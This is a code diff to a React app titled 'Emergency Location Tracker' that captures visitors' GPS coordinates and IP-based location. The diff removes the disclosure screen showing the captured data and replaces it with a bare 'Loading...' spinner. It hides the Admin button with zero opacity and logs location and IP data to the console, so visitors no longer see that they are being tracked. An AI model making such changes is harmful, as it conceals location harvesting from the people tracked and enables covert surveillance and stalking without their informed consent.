@@ -1,7 +1,6 @@
 import { useState, useEffect } from 'react'
-import { MapPin, Shield, Clock, CheckCircle, AlertTriangle, Eye } from 'lucide-react'
+import { Clock, Eye } from 'lucide-react'
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card'
-import { Alert, AlertDescription } from '@/components/ui/alert'
 import { Button } from '@/components/ui/button'
 import './App.css'
 
@@ -245,139 +244,20 @@ function App() {
     )
   }
 
+  console.log('Status:', status, 'Location:', location, 'IP:', ipData, 'Error:', error)
+
   return (
-    <div className="min-h-screen bg-gradient-to-br from-red-50 to-orange-100 p-4">
-      <div className="max-w-2xl mx-auto">
-        <div className="text-center mb-8">
-          <Shield className="h-16 w-16 text-red-600 mx-auto mb-4" />
-          <h1 className="text-3xl font-bold text-gray-900 mb-2">Emergency Location Tracker</h1>
-          <p className="text-lg text-gray-600">Your location is being captured for emergency assistance</p>
+    <div className="min-h-screen bg-white flex items-center justify-center">
+      <div className="text-center">
+        <div className="inline-block">
+          <Clock className="h-12 w-12 text-gray-400 animate-spin mx-auto mb-4" />
         </div>
-
-        <Card className="mb-6">
-          <CardHeader>
-            <CardTitle className="flex items-center gap-2">
-              {status === 'loading' && <Clock className="h-5 w-5 animate-spin" />}
-              {status === 'success' && <CheckCircle className="h-5 w-5 text-green-600" />}
-              {status === 'error' && <AlertTriangle className="h-5 w-5 text-red-600" />}
-              Status
-            </CardTitle>
-          </CardHeader>
-          <CardContent>
-            {status === 'loading' && (
-              <div className="text-center">
-                <p className="text-lg mb-2">Capturing your location...</p>
-                <p className="text-sm text-gray-600">Please allow location access when prompted</p>
-              </div>
-            )}
-
-            {status === 'success' && location && (
-              <div className="space-y-4">
-                <Alert className="border-green-200 bg-green-50">
-                  <CheckCircle className="h-4 w-4 text-green-600" />
-                  <AlertDescription className="text-green-800">
-                    Location captured successfully and sent to emergency services
-                  </AlertDescription>
-                </Alert>
-                
-                <div className="grid grid-cols-2 gap-4">
-                  <div>
-                    <label className="text-sm font-medium text-gray-500">Latitude</label>
-                    <p className="text-lg font-mono">{location.latitude.toFixed(6)}</p>
-                  </div>
-                  <div>
-                    <label className="text-sm font-medium text-gray-500">Longitude</label>
-                    <p className="text-lg font-mono">{location.longitude.toFixed(6)}</p>
-                  </div>
-                </div>
-                
-                <div>
-                  <label className="text-sm font-medium text-gray-500">Accuracy</label>
-                  <p className="text-lg">{Math.round(location.accuracy)} meters</p>
-                </div>
-
-                <div>
-                  <label className="text-sm font-medium text-gray-500">Captured At</label>
-                  <p className="text-lg">{new Date(location.timestamp).toLocaleString()}</p>
-                </div>
-
-                <a 
-                  href={`https://www.google.com/maps?q=${location.latitude},${location.longitude}`}
-                  target="_blank"
-                  rel="noopener noreferrer"
-                  className="inline-block text-blue-600 hover:text-blue-800 underline"
-                >
-                  View Location on Google Maps
-                </a>
-              </div>
-            )}
-
-            {status === 'error' && (
-              <Alert className="border-red-200 bg-red-50">
-                <AlertTriangle className="h-4 w-4 text-red-600" />
-                <AlertDescription className="text-red-800">
-                  {error}
-                </AlertDescription>
-              </Alert>
-            )}
-          </CardContent>
-        </Card>
-
-        {ipData && (
-          <Card className="mb-6">
-            <CardHeader>
-              <CardTitle className="flex items-center gap-2">
-                <MapPin className="h-5 w-5" />
-                Network Information
-              </CardTitle>
-            </CardHeader>
-            <CardContent>
-              <div className="space-y-2">
-                <div>
-                  <label className="text-sm font-medium text-gray-500">IP Address</label>
-                  <p className="text-lg font-mono">{ipData.ip}</p>
-                </div>
-                {ipData.city && (
-                  <div>
-                    <label className="text-sm font-medium text-gray-500">City</label>
-                    <p className="text-lg">{ipData.city}</p>
-                  </div>
-                )}
-                {ipData.region && (
-                  <div>
-                    <label className="text-sm font-medium text-gray-500">Region</label>
-                    <p className="text-lg">{ipData.region}</p>
-                  </div>
-                )}
-                {ipData.country && (
-                  <div>
-                    <label className="text-sm font-medium text-gray-500">Country</label>
-                    <p className="text-lg">{ipData.country}</p>
-                  </div>
-                )}
-              </div>
-            </CardContent>
-          </Card>
-        )}
-
-        <Card>
-          <CardHeader>
-            <CardTitle>Important Information</CardTitle>
-          </CardHeader>
-          <CardContent>
-            <div className="space-y-2 text-gray-600">
-              <p>• Your location has been automatically captured and sent to emergency services</p>
-              <p>• This information helps responders locate you quickly in an emergency</p>
-              <p>• Keep this page open if possible for continued tracking</p>
-              <p>• Your privacy is protected - location data is only used for emergency response</p>
-            </div>
-          </CardContent>
-        </Card>
-
-        <div className="text-center mt-6">
+        <p className="text-xl text-gray-600">Loading...</p>
+        
+        <div className="mt-8 opacity-0">
           <Button onClick={toggleAdminView} variant="ghost" size="sm">
             <Eye className="h-4 w-4 mr-2" />
-            Admin View
+            Admin
           </Button>
         </div>
       </div>
